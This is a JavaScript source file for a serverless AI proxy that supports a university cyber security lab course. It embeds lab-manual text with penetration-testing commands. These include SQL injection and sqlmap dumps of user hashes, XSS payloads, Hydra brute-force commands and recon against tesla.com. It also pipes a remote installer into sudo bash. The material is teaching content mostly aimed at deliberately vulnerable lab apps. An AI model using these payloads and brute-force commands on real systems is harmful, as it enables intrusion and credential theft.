/**
 * S7 Lab — Vercel Serverless AI Proxy with Built-In Lab RAG & Session Memory
 * Keeps all lab context and retrieval on the server side so the terminal client stays tiny.
 */

const fs = require("fs");
const path = require("path");

for (const p of [path.join(__dirname, "../.env"), path.join(__dirname, "../../.env")]) {
  if (fs.existsSync(p)) {
    for (const line of fs.readFileSync(p, "utf8").split(/\r?\n/)) {
      const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?([^"]*)"?\s*$/);
      if (m && !process.env[m[1]]) process.env[m[1]] = m[2];
    }
  }
}

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Proxy-Secret, X-API-Key, X-Provider, X-Session-Id",
};

const FREE_TIER_GEMINI_MODELS = [
  "gemini-3.5-flash-lite",
  "gemini-3.1-flash-lite",
  "gemini-2.5-flash",
  "gemma-4-26b-a4b-it",
];

// In-memory conversation store per session/IP (persists across warm serverless invocations)
const SESSION_MEMORY = new Map();

// ─── Server-Side RAG Knowledge Base (Extracted from Lab Record PDF) ──────────
const LAB_INDEX = `S7 Cyber Security Lab Syllabus (8 Experiments):
Exp 1: Familiarization of Application Penetration Testing (Theory: Passive vs Active Recon, Ethics)
Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng (tesla.com)
Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)
Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure (DNSRecon, theHarvester, Dig, Google Dorks)
Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop (Burp Intruder)
Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA (Manual & SQLMap)
Exp 8 (Practical 7): Client-Side Testing in DVWA (HTML Injection, JS Execution, Reflected/Stored/DOM XSS)`;

const LAB_RAG_DOCS = [
  {
    id: 1,
    patterns: [/\bexp(eriment)?\s*1\b/i, /\bfamiliarization\b/i, /\bpassive\b/i, /\bactive recon/i, /\bethic/i],
    keywords: ["passive", "active", "reconnaissance", "ethics", "authorization", "scope", "shodan", "nikto", "dirbuster"],
    content: `Experiment 1: Familiarization of Application Penetration Testing
Aim: Familiarize with application pentesting concepts, recon tools, and ethical rules.
- Application Penetration Testing: Simulating real-world attacks on web/mobile apps to find insecure coding, misconfigurations, auth flaws, and data leaks.
- Passive Reconnaissance: Gathering info without directly touching the target (WHOIS, search engines, Shodan, breach DBs). Tools: theHarvester, Maltego, Recon-ng, Shodan.
- Active Reconnaissance: Directly probing the target for open ports, services, and directories. Tools: Nmap, Burp Suite, OWASP ZAP, Nikto, DirBuster, Gobuster, FFUF.
- Ethical Considerations: Must have written authorization, strictly follow scope, avoid DoS/data loss, and report responsibly.`,
  },
  {
    id: 2,
    patterns: [/\bexp(eriment)?\s*2\b/i, /\bpract(ical)?\s*1\b/i, /\brecon-?ng\b/i, /\bhackertarget\b/i, /\bwhois_pocs\b/i, /\bbrute_hosts\b/i, /\bbing_domain_web\b/i],
    keywords: ["recon-ng", "workspaces", "testspace", "marketplace", "hackertarget", "whois_pocs", "brute_hosts", "bing_domain_web", "tesla.com"],
    content: `Experiment 2 (Practical 1): Reconnaissance and Information Gathering Using Recon-ng
Target: tesla.com | Tool: Recon-ng
 Modules Used:
1. recon/domains-hosts/hackertarget (Subdomain enumeration using HackerTarget)
2. recon/domains-contacts/whois_pocs (WHOIS Point of Contact extraction)
3. recon/domains-hosts/brute_hosts (Brute-force subdomain discovery)
4. recon/domains-hosts/bing_domain_web (Subdomain discovery via Bing search)
Procedure & Commands:
  sudo apt update && sudo apt install -y recon-ng
  recon-ng
  workspaces create testspace
  workspaces select testspace
  marketplace search
  marketplace install recon/domains-hosts/hackertarget
  marketplace install recon/domains-contacts/whois_pocs
  marketplace install recon/domains-hosts/brute_hosts
  marketplace install recon/domains-hosts/bing_domain_web
  modules load recon/domains-hosts/hackertarget
  options set SOURCE tesla.com
  run
  modules load recon/domains-contacts/whois_pocs
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/brute_hosts
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/bing_domain_web
  options set SOURCE tesla.com
  run
  show hosts
  show contacts`,
  },
  {
    id: 3,
    patterns: [/\bexp(eriment)?\s*3\b/i, /\bpract(ical)?\s*2\b/i, /\bmaltego\b/i, /\bnmap\b/i, /\bgobuster\b/i, /\bffuf\b/i, /\bfootprinting\b/i],
    keywords: ["maltego", "nmap", "gobuster", "ffuf", "common.txt", "vulnweb", "footprint", "ports", "dirb"],
    content: `Experiment 3 (Practical 2): Network Footprinting & Enumeration Using Maltego, Nmap, Gobuster, FFUF
Target: testphp.vulnweb.com / <Lab-Target-IP>
1. Maltego (Passive OSINT): Launch 'maltego' -> Machines > Run Machine > Footprint L1 -> domain: testphp.vulnweb.com.
2. Nmap Flags & Commands:
   -sn (Ping scan / host discovery), -sV (Service versions), -p (Specific ports), -p- (All 65535 ports),
   -A (Aggressive: OS + version + script scan + traceroute), -Pn (Treat host as online), -T4 (Faster speed), -O (OS detection), -F (Fast top 100 ports).
   Commands:
   sudo nmap -sn <Target-IP>/24
   sudo nmap -sV -O -p- -A -T4 <TARGET-IP>
   sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com
   sudo nmap -F testphp.vulnweb.com
3. Gobuster Directory Enumeration:
   gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt
4. FFUF Directory Fuzzing:
   ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
Ubuntu Wordlist Setup:
   sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt`,
  },
  {
    id: 4,
    patterns: [/\bexp(eriment)?\s*4\b/i, /\bpract(ical)?\s*3\b/i, /\bdnsrecon\b/i, /\btheharvester\b/i, /\bdig\b/i, /\bdork/i],
    keywords: ["dnsrecon", "theharvester", "dig", "dork", "inurl", "intitle", "filetype", "mx", "ns", "soa", "seclists"],
    content: `Experiment 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure
Tools: DNSRecon, theHarvester, Dig, Google Dorking | Target: tesla.com / testphp.vulnweb.com
Step 1: DNSRecon (enumerates NS, A, MX, SOA, TXT/SPF and brute-forces subdomains):
  dnsrecon -d tesla.com
  dnsrecon -d tesla.com -t std --xml tesla_dns.xml
  dnsrecon -d tesla.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Step 2: theHarvester (email & subdomain gathering):
  theHarvester -d tesla.com -b bing
Step 3: Dig Manual DNS Queries:
  dig tesla.com
  dig +short NS tesla.com
  dig +short MX tesla.com
Step 4: Google Dorking (inurl:, intitle:, filetype:, site:, intext:):
  inurl:admin site:tesla.com
  intitle:"login" site:tesla.com
  inurl:login site:testphp.vulnweb.com
  filetype:php inurl:admin
  site:github.com inurl:login`,
  },
  {
    id: 5,
    patterns: [/\bexp(eriment)?\s*5\b/i, /\bpract(ical)?\s*4\b/i, /\bwpscan\b/i, /\bzap(roxy)?\b/i, /\bhydra\b/i, /\bnvd\b/i, /\bwordpress\b/i],
    keywords: ["wpscan", "zap", "zaproxy", "hydra", "nvd", "cve", "cwe", "wordpress", "wp-login", "fsocity", "rockyou", "elliot"],
    content: `Experiment 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
Definitions:
- NVD (National Vulnerability Database): https://nvd.nist.gov/ repository of CVEs, CVSS severity, and mitigations.
- CVE: Unique vulnerability ID (e.g., CVE-2024-12345).
- CWE: Flaw category (e.g., CWE-79 = XSS, CWE-89 = SQL Injection).
Step 1: WPScan (u = usernames, vp = vulnerable plugins, vt = vulnerable themes):
  wpscan --url http://<target-ip> --enumerate u,vp,vt
Step 2: Validate CVEs in NVD (https://nvd.nist.gov/).
Step 3: OWASP ZAP (zaproxy):
  Proxy on 127.0.0.1:8080 -> Traditional Spider (HTML) & AJAX Spider (JS) -> Passive Scan & Active Scan (XSS, SQLi, missing headers, insecure cookies).
Step 4: Brute-Force Login with Hydra:
  sort fsocity.dic | uniq > fsocity.dic.uniq
  hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
  hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'`,
  },
  {
    id: 6,
    patterns: [/\bexp(eriment)?\s*6\b/i, /\bpract(ical)?\s*5\b/i, /\bjuice\s*shop\b/i, /\bcluster\s*bomb\b/i, /\bintruder\b/i, /\bsamuel\b/i, /\bjim\b/i, /\ballow_hijacking_localhost\b/i],
    keywords: ["juice", "juice-shop", "burp", "intruder", "cluster", "samuel", "jim", "localhost", "about:config", "lockout", "42000"],
    content: `Experiment 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop
Target: http://127.0.0.1:42000 (or Docker: sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop)
Firefox Localhost Proxy Fix for Burp Suite (127.0.0.1:8080):
  Open about:config in Firefox -> set network.proxy.allow_hijacking_localhost = true.
Step 1: Test Role Definitions (/administration -> 403 Forbidden for normal user).
Step 2: Test User Registration & Account Enumeration (check product reviews for exposed emails like jim@juice-sh.op, admin@juice-sh.op).
Step 3: Default Credentials & Brute-Force with Burp Intruder (Cluster Bomb):
  - Capture login POST request -> Send to Intruder -> Clear § -> Mark username & password: username=§USERNAME§&password=§PASSWORD§
  - Attack Type: Cluster Bomb (or Sniper with admin@juice-sh.op).
  - Uncheck '.' (dot) from Payload Encoding in Payloads tab.
  - Payload Set 1 (Usernames): admin@juice-sh.op, administrator@juice-sh.op, root@juice-sh.op, user@juice-sh.op, test@juice-sh.op, guest@juice-sh.op, manager@juice-sh.op, support@juice-sh.op, security@juice-sh.op
  - Payload Set 2 (Passwords): admin, password, 123456, juice, welcome, admin123
  - Result: HTTP 200 OK on admin@juice-sh.op : admin123.
Step 4: Weak Lockout (10+ failed logins), Browser Cache (Back button after logout), & Jim's Password Reset (OSINT):
  - Jim's Green Smoothie review mentions "replicator" (Star Trek -> James T. Kirk).
  - Forgot Password for jim@juice-sh.op asks "Eldest brother's middle name?" -> Answer: Samuel (George Samuel Kirk).`,
  },
  {
    id: 7,
    patterns: [/\bexp(eriment)?\s*7\b/i, /\bpract(ical)?\s*6\b/i, /\bsqli?\b/i, /\bsql\s*injection\b/i, /\bsqlmap\b/i, /\bblind\b/i],
    keywords: ["sqli", "sql", "sqlmap", "blind", "union", "information_schema", "dvwa", "phpsessid", "version()", "substring"],
    content: `Experiment 7 (Practical 6): SQL Injection and Blind SQL Injection in DVWA
Target: http://localhost/DVWA (Login: admin / password, Security Level: Low)
Install DVWA:
  sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
  (or Docker: sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa)
Part A — Classic SQL Injection Payloads:
  Step 5 (Trigger error): 1'
  Step 6 (Auth bypass / all users): 1' AND 1=2 #   and   1' OR '1'='1
  Step 7 (Database version): 1' UNION SELECT null, version() #
  Step 8 (List tables): 1' UNION SELECT null, table_name FROM information_schema.tables #
  Step 8 (List columns of users): 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
  Dump users & hashes: 1' UNION SELECT user, password FROM users #
Part B — Blind SQL Injection Payloads:
  Step 10: 1'
  Step 11 (Boolean True vs False): 1' AND 1=1 #  (True) vs  1' AND 1=2 #  (False)
  Step 12 (Char-by-char database name check): 1' AND SUBSTRING(database(),1,1)='d' #
  Step 13.1 (SQLMap list DBs):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch
  Step 13.2 (SQLMap list tables in dvwa):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5
  Step 14 (SQLMap dump users table & crack MD5 hashes like admin:password, gordonb:abc123):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5`,
  },
  {
    id: 8,
    patterns: [/\bexp(eriment)?\s*8\b/i, /\bpract(ical)?\s*7\b/i, /\bxss\b/i, /\bclient-?side\b/i, /\bhtml\s*injection\b/i, /\bdocument\.cookie\b/i],
    keywords: ["xss", "stored", "reflected", "dom", "html", "cookie", "onmouseover", "onerror", "iframe", "guestbook"],
    content: `Experiment 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)
Target: http://localhost/dvwa/ (Login: admin / password, Security Level: Low)
Step 2 — HTML Injection (in XSS Stored):
  <h1>Website Defaced by Student</h1>
Step 3 — JavaScript Execution & Cookie Theft (in XSS Stored — increase maxlength in Inspect Element if needed):
  <script>alert('JavaScript Executed!')</script>
  <script>alert('Cookies: ' + document.cookie)</script>
Step 4 — Reflected XSS (in XSS Reflected):
  <button onclick="alert('1')">Click Me!</button>
Step 5 — DOM-Based XSS (in XSS DOM, modify URL default= parameter):
  http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
Step 6 — Stored XSS (Compact Event Handler) & Alternative Filter-Bypass Payloads:
  <div onmouseover=alert(1)>Hover</div>
  <img src=x onmouseover=alert('XSS')>
  <img src=invalidImage onerror=alert('XSS')>
  <input autofocus onfocus=alert('XSS')>
  <body onload=alert('XSS')>
  <a href="javascript:alert('XSS')">Click Me</a>
  <iframe src="javascript:alert('Iframe XSS')"></iframe>`,
  },
];

function retrieveLabRAG(query, history = [], activeExp = "") {
  const combined = `${activeExp ? `exp ${activeExp} ` : ""}${query} ${
    history.slice(-2).map((h) => h.content || "").join(" ")
  }`.toLowerCase();

  const scored = LAB_RAG_DOCS.map((doc) => {
    let score = 0;
    if (activeExp && String(doc.id) === String(activeExp)) score += 100;
    for (const pat of doc.patterns) {
      if (pat.test(combined)) score += 30;
    }
    for (const kw of doc.keywords) {
      if (combined.includes(kw)) score += 10;
    }
    return { doc, score };
  })
    .filter((x) => x.score > 0)
    .sort((a, b) => b.score - a.score);

  if (scored.length === 0) {
    return `${LAB_INDEX}`;
  }

  const topDocs = scored.slice(0, 2).map((x) => x.doc.content);
  return `${LAB_INDEX}\n\nRetrieved Lab Manual Context (RAG):\n${topDocs.join("\n\n---\n\n")}`;
}

async function fetchWebContext(query) {
  const results = [];
  const sources = [];
  try {
    const ddgUrl = `https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json&no_html=1&skip_disambig=1`;
    const ddgResp = await fetch(ddgUrl, { headers: { "User-Agent": "S7-Lab-Proxy/1.0" } });
    if (ddgResp.ok) {
      const ddg = await ddgResp.json();
      if (ddg.AbstractText) {
        results.push(`Summary: ${ddg.AbstractText}`);
        if (ddg.AbstractURL) sources.push(ddg.AbstractURL);
      }
      if (Array.isArray(ddg.RelatedTopics)) {
        for (const t of ddg.RelatedTopics.slice(0, 3)) {
          if (t.Text) results.push(`- ${t.Text}`);
          if (t.FirstURL) sources.push(t.FirstURL);
        }
      }
    }
  } catch (_) {}

  return {
    contextText: results.length > 0 ? `Live Web Results:\n${results.join("\n")}` : "",
    sources: [...new Set(sources)].slice(0, 4),
  };
}

async function callGemini({ apiKey, model, prompt, system, history }) {
  const candidateModels = model
    ? [model, ...FREE_TIER_GEMINI_MODELS.filter((m) => m !== model)]
    : FREE_TIER_GEMINI_MODELS;

  const contents = [];
  if (Array.isArray(history)) {
    for (const h of history) {
      if (!h || !h.content) continue;
      contents.push({
        role: h.role === "assistant" ? "model" : "user",
        parts: [{ text: String(h.content) }],
      });
    }
  }
  contents.push({ role: "user", parts: [{ text: prompt }] });

  const lastErrors = [];
  for (const modelName of candidateModels) {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${modelName}:generateContent?key=${apiKey}`;
    const isGemma = modelName.startsWith("gemma-");
    const body = isGemma
      ? {
          contents: [
            ...(system ? [{ role: "user", parts: [{ text: `System Instruction:\n${system}` }] }] : []),
            ...contents,
          ],
        }
      : {
          contents,
          systemInstruction: system ? { parts: [{ text: system }] } : undefined,
        };

    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (resp.ok) {
      const data = await resp.json();
      const candidate = (data.candidates && data.candidates[0]) || {};
      const parts = (candidate.content && candidate.content.parts) || [];
      const textParts = parts.filter((p) => !p.thought).map((p) => p.text || "");
      const reply = (textParts.length ? textParts : parts.map((p) => p.text || "")).join("\n").trim();
      return { reply, provider: `gemini (${modelName})`, sources: [] };
    }

    const errText = await resp.text();
    lastErrors.push(`${modelName} -> HTTP ${resp.status}: ${errText.slice(0, 150)}`);
  }

  throw new Error(lastErrors.join(" | "));
}

async function callOpenAICompatible({ endpoint, apiKey, model, prompt, system, history, providerLabel }) {
  const messages = [];
  if (system) messages.push({ role: "system", content: system });
  if (Array.isArray(history)) {
    for (const h of history) {
      if (h && h.content) {
        messages.push({ role: h.role === "assistant" ? "assistant" : "user", content: String(h.content) });
      }
    }
  }
  messages.push({ role: "user", content: prompt });

  const resp = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${apiKey}`,
    },
    body: JSON.stringify({ model, messages, temperature: 0.3 }),
  });

  if (!resp.ok) {
    const errText = await resp.text();
    throw new Error(`${providerLabel} HTTP ${resp.status}: ${errText}`);
  }

  const data = await resp.json();
  const reply = data.choices?.[0]?.message?.content || "";
  return { reply, provider: `${providerLabel} (${model})`, sources: [] };
}

async function handleAIRequest(reqBody, env, reqHeaders, sessionId = "default") {
  const prompt = (reqBody.prompt || reqBody.q || "").trim();
  if (!prompt) {
    return { error: "Missing 'prompt' in request body.", status: 400 };
  }

  if (prompt.toLowerCase() === "clear" || prompt.toLowerCase() === "/clear") {
    SESSION_MEMORY.delete(sessionId);
    return { data: { reply: "Conversation history cleared.", provider: "rag-session", sources: [] }, status: 200 };
  }

  const storedHistory = SESSION_MEMORY.get(sessionId) || [];
  const history = Array.isArray(reqBody.history) && reqBody.history.length > 0 ? reqBody.history : storedHistory;
  const activeExp = reqBody.exp || reqHeaders["x-exp"] || "";

  // 1. Retrieve relevant Lab Manual chunks via Server-Side RAG (skip duplicate chunk if client already attached Local RAG)
  const hasClientRAG = Boolean(reqHeaders["x-client-rag"]) || prompt.includes("Local Lab Context (RAG):");
  const ragContext = hasClientRAG ? LAB_INDEX : retrieveLabRAG(prompt, history, activeExp);
  let system = `You are a concise, terminal-friendly Cyber Security Lab Assistant for Ubuntu Linux & Kali. Give brief, copy-paste ready terminal commands and payloads without fluff.\n\n${ragContext}`;

  // 2. Enrich with live DuckDuckGo web context if enabled
  let webSources = [];
  if (reqBody.search !== false) {
    const webData = await fetchWebContext(prompt);
    if (webData.contextText) {
      system += `\n\n${webData.contextText}`;
      webSources = webData.sources;
    }
  }

  const requestedProvider = (reqBody.provider || reqHeaders["x-provider"] || "auto").toLowerCase();
  const passKey = reqHeaders["x-api-key"] || reqBody.api_key || "";

  const geminiKey =
    (requestedProvider === "gemini" && passKey) ||
    env.GEMINI_API_KEY ||
    (passKey.startsWith("AIza") || passKey.startsWith("AQ.") ? passKey : "");
  const groqKey = (requestedProvider === "groq" && passKey) || env.GROQ_API_KEY || (passKey.startsWith("gsk_") ? passKey : "");
  const openaiKey =
    (requestedProvider === "openai" && passKey) ||
    env.OPENAI_API_KEY ||
    (passKey.startsWith("sk-") && !passKey.startsWith("sk-or-") ? passKey : "");
  const openrouterKey =
    (requestedProvider === "openrouter" && passKey) ||
    env.OPENROUTER_API_KEY ||
    (passKey.startsWith("sk-or-") ? passKey : "");

  const attempts = [];

  if ((requestedProvider === "auto" || requestedProvider === "gemini") && geminiKey) {
    attempts.push(() =>
      callGemini({
        apiKey: geminiKey,
        model: reqBody.model || env.GEMINI_MODEL || "gemini-3.5-flash-lite",
        prompt,
        system,
        history,
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "groq") && groqKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.groq.com/openai/v1/chat/completions",
        apiKey: groqKey,
        model: reqBody.model || env.GROQ_MODEL || "llama-3.3-70b-versatile",
        prompt,
        system,
        history,
        providerLabel: "groq",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openai") && openaiKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.openai.com/v1/chat/completions",
        apiKey: openaiKey,
        model: reqBody.model || env.OPENAI_MODEL || "gpt-4o-mini",
        prompt,
        system,
        history,
        providerLabel: "openai",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openrouter") && openrouterKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://openrouter.ai/api/v1/chat/completions",
        apiKey: openrouterKey,
        model: reqBody.model || env.OPENROUTER_MODEL || "google/gemini-2.5-flash",
        prompt,
        system,
        history,
        providerLabel: "openrouter",
      })
    );
  }

  if (attempts.length === 0) {
    return {
      error: "No API key configured on Vercel server. Set GEMINI_API_KEY in Vercel Environment Variables.",
      status: 500,
    };
  }

  const errors = [];
  for (const fn of attempts) {
    try {
      const res = await fn();
      res.sources = [...new Set([...(res.sources || []), ...webSources])].slice(0, 5);
      // Save turn in server-side session memory
      const updated = [
        ...history,
        { role: "user", content: prompt },
        { role: "assistant", content: res.reply },
      ].slice(-12);
      SESSION_MEMORY.set(sessionId, updated);
      return { data: res, status: 200 };
    } catch (e) {
      errors.push(e.message || String(e));
    }
  }

  return { error: `All upstream AI providers failed: ${errors.join(" | ")}`, status: 502 };
}

module.exports = async function handler(req, res) {
  for (const [k, v] of Object.entries(CORS_HEADERS)) {
    res.setHeader(k, v);
  }

  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    return res.end();
  }

  const proto = req.headers["x-forwarded-proto"] || "https";
  const host = req.headers["x-forwarded-host"] || req.headers.host || "localhost:3000";
  const baseUrl = `${proto}://${host}`;
  const parsedUrl = new URL(req.url || "/", baseUrl);
  const pathName = parsedUrl.pathname;

  const sessionId =
    req.headers["x-session-id"] ||
    parsedUrl.searchParams.get("session") ||
    (req.headers["x-forwarded-for"] || "default").split(",")[0].trim();

  if (process.env.PROXY_SECRET) {
    const clientSecret = req.headers["x-proxy-secret"] || parsedUrl.searchParams.get("secret") || "";
    if (clientSecret !== process.env.PROXY_SECRET) {
      res.statusCode = 401;
      res.setHeader("Content-Type", "application/json");
      return res.end(JSON.stringify({ error: "Unauthorized: Invalid X-Proxy-Secret" }));
    }
  }

  if (pathName === "/s7" || pathName === "/cli") {
    for (const p of [path.join(__dirname, "../s7"), path.join(__dirname, "../../s7")]) {
      if (fs.existsSync(p)) {
        res.statusCode = 200;
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        return res.end(fs.readFileSync(p, "utf8"));
      }
    }
  }

  if (pathName === "/s7.ps1" || pathName === "/ps1") {
    for (const p of [path.join(__dirname, "../s7.ps1"), path.join(__dirname, "../../s7.ps1")]) {
      if (fs.existsSync(p)) {
        res.statusCode = 200;
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        return res.end(fs.readFileSync(p, "utf8"));
      }
    }
  }

  if (pathName === "/" || pathName === "/help" || pathName === "/health" || pathName === "/api/health") {
    const helpText = [
      "S7 Lab — Quick Terminal Cheat Sheet",
      "",
      "1. Download & Start Interactive Tool (Ubuntu / Linux):",
      `   curl -sL ${baseUrl}/s7 -o s7 && chmod +x s7 && ./s7`,
      "",
      "2. Once Downloaded, Use ./s7 Commands:",
      "   ./s7              # Interactive menu (Arrows or 1-8, c=cmds, s=search, a=AI)",
      "   ./s7 <1-8>        # Full instructions + commands for Experiment 1-8",
      "   ./s7 c <1-8>      # Commands-Only mode (e.g. ./s7 c 7)",
      "   ./s7 s <keyword>  # Search all experiments (e.g. ./s7 s hydra)",
      "   ./s7 ai           # Continuous multi-turn AI chat",
      "   ./s7 ai \"query\"   # One-line AI question",
      "   ./s7 help         # Full help & keybindings",
      "",
      "3. Direct curl Commands (Without downloading s7):",
      `   curl -sL ${baseUrl}/1   (or /2 .. /8 for any experiment)`,
      `   curl -sL ${baseUrl}/ask -d "your question here"`,
      "",
      "4. Windows PowerShell (use 'irm' or 'curl.exe', not 'curl'):",
      `   irm ${baseUrl}`,
      `   irm ${baseUrl}/s7.ps1 -OutFile s7.ps1; .\\s7.ps1`,
      `   curl.exe -sL ${baseUrl}/7`,
    ].join("\n");
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.end(helpText + "\n");
  }

  // Direct curl /1 .. /8 to view experiment without downloading script
  const expMatch = pathName.match(/^\/([1-8])$/);
  if (expMatch) {
    const doc = LAB_RAG_DOCS.find((d) => d.id === Number(expMatch[1]));
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.end((doc ? doc.content : "Not found") + "\n");
  }

  let body = req.body;
  if (!body && req.method === "POST") {
    body = await new Promise((resolve) => {
      let data = "";
      req.on("data", (chunk) => (data += chunk));
      req.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch (_) {
          resolve(data);
        }
      });
    });
  }

  if (pathName === "/api/chat" && req.method === "POST") {
    const jsonBody = typeof body === "object" && body !== null ? body : { prompt: String(body || "") };
    const result = await handleAIRequest(jsonBody, process.env, req.headers, sessionId);
    res.statusCode = result.status || 200;
    res.setHeader("Content-Type", "application/json; charset=utf-8");
    return res.end(JSON.stringify(result.error ? { error: result.error } : result.data));
  }

  if (pathName === "/ask" || pathName === "/api/ask") {
    let prompt = parsedUrl.searchParams.get("q") || "";
    let history = [];
    let exp = parsedUrl.searchParams.get("exp") || "";
    if (!prompt && req.method === "POST") {
      if (typeof body === "string") prompt = body;
      else if (Buffer.isBuffer(body)) prompt = body.toString("utf8");
      else if (body && typeof body === "object") {
        prompt = body.prompt || body.q || Object.entries(body).map(([k, v]) => (v ? `${k}=${v}` : k)).join("&");
        if (Array.isArray(body.history)) history = body.history;
        if (body.exp) exp = body.exp;
      }
    }
    const result = await handleAIRequest({ prompt, history, exp, search: true }, process.env, req.headers, sessionId);
    res.statusCode = result.status || 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    if (result.error) {
      return res.end(`[ERROR] ${result.error}\n`);
    }
    return res.end(`${result.data.reply}\n`);
  }

  res.statusCode = 404;
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  return res.end("Not Found. Use /ask?q=... or POST /api/chat\n");
};

if (require.main === module) {
  const http = require("http");
  const port = process.env.PORT || 8787;
  http.createServer((req, res) => module.exports(req, res)).listen(port, () => {
    console.log(`S7 Local RAG Proxy listening on http://127.0.0.1:${port}`);
  });
}
